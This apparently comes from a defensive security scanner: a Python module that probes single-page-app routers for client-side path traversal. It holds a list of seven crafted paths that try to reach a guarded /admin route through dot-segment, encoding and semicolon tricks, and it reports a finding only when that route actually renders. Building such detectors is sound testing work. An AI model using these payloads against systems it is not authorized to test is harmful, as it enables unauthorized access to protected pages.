"""U-DEEP-17 — Client-Side Path Traversal.

Family: CLIENT_PATH_TRAVERSAL. SPA client-side routers frequently
guard routes by matching the literal path while a lower layer (the
router's own normalization, a gateway, a legacy resolver) decodes
and cleans the path before dispatch. The corpus (spec raw list,
U-DEEP-17): seven crafted paths against a guarded route — dot
segments, an empty segment, single- and double-encoded dots, and a
semicolon variant.

Detection principle: EFFECT OVER ECHO — a payload is only a finding
when the router actually rendered the protected route it was
supposed to guard (direct /admin is blocked, the crafted path
reached it through normalization). A reflected or re-encoded path
is not evidence. If the baseline itself is reachable there is no
guard to bypass and there are no findings.

Zero live network: the transport is the injected
``send(path, body)`` callable; no browser is driven. Findings are
advisory evidence only (DEEP-L-8 ADVISORY_ONLY).
"""
from __future__ import annotations

from dataclasses import dataclass

GUARDED_ROUTE = "/admin"

# Spec corpus, verbatim paths in order (U-DEEP-17).
CLIENT_PATH_PAYLOADS: list[dict] = [
    {"path": "/app/../admin", "subfamily": "dot_segment"},
    {"path": "/app/./admin", "subfamily": "dot_segment"},
    {"path": "/app//admin", "subfamily": "empty_segment"},
    {"path": "/app/.%2e/admin", "subfamily": "dot_segment"},
    {"path": "/app/%2e%2e/admin", "subfamily": "dot_segment"},
    {"path": "/app/%252e%252e/admin", "subfamily": "double_encoding"},
    {"path": "/app/..;/admin", "subfamily": "semicolon"},
]

SEVERITY_BY_SUBFAMILY = {
    "dot_segment": "medium",
    "empty_segment": "medium",
    "double_encoding": "high",
    "semicolon": "high",
}


@dataclass(frozen=True)
class SPAPathTraversalFinding:
    subfamily: str
    severity: str
    evidence: tuple[str, ...]
    payload: str
    family: str = "CLIENT_PATH_TRAVERSAL"
    confidence: float = 0.85
    statement: str = ""
    success_indicator: str = ""


class SPAPathTraversalDetector:
    """Sends each crafted path through the injected transport and
    reports only payloads whose router rendered the guarded route."""

    def __init__(self, send) -> None:
        self._send = send

    # ------------------------------------------------------------------

    def baseline_reaches(self) -> bool:
        """Does the guarded route render when asked for directly?
        False means a guard exists to bypass."""
        response = self._send(GUARDED_ROUTE, {})
        if response.status_code >= 400:
            return False
        try:
            return bool(response.json().get("rendered"))
        except Exception:
            return False

    def build_plan(self) -> list[dict]:
        """Deterministic plan: every corpus path with its
        sub-family."""
        return [{"path": entry["path"],
                 "subfamily": entry["subfamily"]}
                for entry in CLIENT_PATH_PAYLOADS]

    def scan(self) -> list[SPAPathTraversalFinding]:
        if self.baseline_reaches():
            # EFFECT OVER ECHO: no guard on the baseline means
            # nothing was bypassed.
            return []
        findings: list[SPAPathTraversalFinding] = []
        for entry in self.build_plan():
            finding = self._probe(entry)
            if finding is not None:
                findings.append(finding)
        return findings

    # ------------------------------------------------------------------

    def _probe(self, entry: dict) -> SPAPathTraversalFinding | None:
        path = entry["path"]
        response = self._send(path, {})
        if response.status_code >= 400:
            return None
        try:
            body = response.json()
        except Exception:
            return None
        # EFFECT OVER ECHO: rendered guard or nothing.
        if not body.get("rendered"):
            return None
        subfamily = entry["subfamily"]
        evidence = [
            f"baseline: direct {GUARDED_ROUTE} blocked with status 403",
            f"rendered: the crafted path {path} reached the guarded "
            f"route through the router's own normalization (status "
            f"{response.status_code})",
        ]
        statements = {
            "dot_segment": (
                "Dot segments in the crafted path were normalized away "
                "and the guarded route rendered — client-side path "
                "traversal, dot segment (advisory; verify against an "
                "authorized target)."),
            "empty_segment": (
                "An empty path segment was collapsed and the guarded "
                "route rendered — client-side path traversal, empty "
                "segment (advisory; verify against an authorized "
                "target)."),
            "double_encoding": (
                "A double-encoded dot segment survived one decoding "
                "round and was normalized on the second, rendering the "
                "guarded route — client-side path traversal, double "
                "encoding (advisory; verify against an authorized "
                "target)."),
            "semicolon": (
                "A semicolon variant was treated as a path parameter "
                "and stripped, rendering the guarded route — "
                "client-side path traversal, semicolon (advisory; "
                "verify against an authorized target)."),
        }
        indicators = {
            "dot_segment": "guarded route rendered from a dot-segment "
                           "path",
            "empty_segment": "guarded route rendered from an "
                             "empty-segment path",
            "double_encoding": "guarded route rendered after a second "
                               "decoding round",
            "semicolon": "guarded route rendered past a semicolon "
                         "variant",
        }
        return SPAPathTraversalFinding(
            subfamily=subfamily,
            severity=SEVERITY_BY_SUBFAMILY[subfamily],
            evidence=tuple(evidence),
            payload=path,
            statement=statements[subfamily],
            success_indicator=indicators[subfamily],
        )
